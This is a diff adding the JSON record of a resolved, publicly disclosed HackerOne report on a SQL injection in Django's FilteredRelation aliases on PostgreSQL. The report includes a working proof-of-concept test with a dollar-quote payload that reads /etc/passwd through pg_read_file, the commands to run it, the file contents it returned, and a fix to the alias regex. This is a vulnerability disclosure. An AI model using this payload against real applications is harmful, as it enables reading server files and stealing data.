@@ -1,0 +1,134 @@
+{
+  "id": 3417967,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE3OTY3",
+  "url": "https://hackerone.com/reports/3417967",
+  "title": "Potential SQL Injection when annotating FilteredRelation on PostgreSQL",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2025-11-09T20:23:32.058Z",
+  "submitted_at": "2025-11-09T20:26:45.250Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "stackered",
+    "url": "/stackered",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/vw8uf97yenmngw3n4n0pjtjla2ov/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23,
+    "url": "https://hackerone.com/django",
+    "handle": "django",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Django",
+      "twitter_handle": null,
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2025-57833",
+    "CVE-2025-59681"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2025-12-02T15:28:06.954Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-12-02T15:28:06.877Z",
+  "team_member_agreed_on_going_public_at": "2025-12-02T15:24:49.521Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Django security team !\n\nThis vulnerability is related to [CVE 2025-57833](https://docs.djangoproject.com/en/dev/releases/security/#september-3-2025-cve-2025-57833) and [CVE 2025-59681](https://docs.djangoproject.com/en/dev/releases/security/#october-1-2025-cve-2025-59681) as it results from an incomplete Regex filter in the [FORBIDDEN_ALIAS_PATTERN](https://github.com/django/django/blob/4ceaaee7e04b416fc465e838a6ef43ca0ccffafe/django/db/models/sql/query.py#L60).\n\nOn PostgreSQL, the `$` symbol can be used to replace quotes and build raw string between tags like this : `$$something$$` or `$tag$something$tag$`. This can be abused to make part of the query interpreted as a raw string instead of the actual query to execute. Under some circumstances, this allows to build injections, as proven by the following PoC.\n\nThe following PoC can be pasted inside the `FilteredRelationTests` class in the file `tests/filtered_relation/tests.py`\n\n```python\ndef test_sqli(self):\n        user_data = \"$a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1\"\n\n        qs = (\n            Book.objects.annotate(**{\n                user_data: FilteredRelation(\n                \"editor\"            ),\n        })\n            .select_related(user_data)\n        )\n\n        try:\n            import django\n            for e in qs.all():\n                print(\"######### Injected #########\")\n                print(e.title)\n                print(\"############################\")\n        except django.db.utils.ProgrammingError as e:\n            print(f\"------\\n{e}\")\n```\n\nThis POC will read `/etc/passwd` from the PostgreSQL Docker container, which you can run using this command :\n\n```bash\ndocker run --rm -it --net=host --name some-postgis -e POSTGRES_PASSWORD=mysecretpassword -d postgres\n```\n\nChange the `tests/test_sqlite.py` file to :\n\n```python\nDATABASES = {\n    \"default\": {\n        \"ENGINE\": \"django.db.backends.postgresql\",\n        \"NAME\": \"django\",\n        \"USER\": \"postgres\",\n        \"PORT\": 5432,\n        \"HOST\": \"localhost\"\n    },\n}\nSECRET_KEY = \"mysecretpassword\"\n```\n\nFinally, the PoC can be executed with the following command:\n\n```bash\ncd django/tests\npython3 runtests.py filtered_relation.tests.FilteredRelationTests.test_sqli\n```\n\nHere is the output, showing the file was successfully read on the Docker container.\n\n```\n######### Injected #########\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\npostgres:x:999:999::/var/lib/postgresql:/bin/bash\n\n############################\n```\n\nThe full SQL query that was executed is the following :\n\n```sql\nSELECT \"filtered_relation_book\".\"id\", \"filtered_relation_book\".\"title\", \"filtered_relation_book\".\"author_id\", \"filtered_relation_book\".\"editor_id\", \"filtered_relation_book\".\"number_editor\", \"filtered_relation_book\".\"editor_number\", \"filtered_relation_book\".\"state\", $a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1.\"id\", $a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1.\"name\" FROM \"filtered_relation_book\" INNER JOIN \"filtered_relation_editor\" $a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1 ON (\"filtered_relation_book\".\"editor_id\" = $a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1.\"id\")\n```\n\nThis exploit works in this context because the user input is reflected multiple times in the query, allowing the `$a$, $b$, $c$, ...` tags to be closed and making most of the query be interpreted as raw strings for the select statement.\n\nHere is the simplified query for better readability:\n\n```sql\nSELECT \"filtered_relation_book\".\"id\", \"filtered_relation_book\".\"title\", \"filtered_relation_book\".\"author_id\", \"filtered_relation_book\".\"editor_id\", \"filtered_relation_book\".\"number_editor\", \"filtered_relation_book\".\"editor_number\", \"filtered_relation_book\".\"state\", $a$...$a$,$b$...$b$,$c$...$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1.\"id\")\n```\n\n## Impact\n\nThe impact is a SQL injection allowing to exfiltrate data, read system files as the PoC demonstrates, or allow remote command execution.\n\n## Remediation\n\nThe remediation consists in adding the `$` symbol to the [FORBIDDEN_ALIAS_PATTERN](https://github.com/django/django/blob/4ceaaee7e04b416fc465e838a6ef43ca0ccffafe/django/db/models/sql/query.py#L60) regex.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-01-01T15:24:49.666Z",
+  "allow_singular_disclosure_after": -11057729.366767505,
+  "singular_disclosure_allowed": true,
+  "vote_count": 51,
+  "voters": [
+    "sh1ne",
+    "cymans",
+    "maskopatol",
+    "zy9ard3",
+    "yoyomiski",
+    "mohaned0101",
+    "thalaivar304",
+    "ahmed_xyz",
+    "stackered",
+    "jmo740",
+    "and 41 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
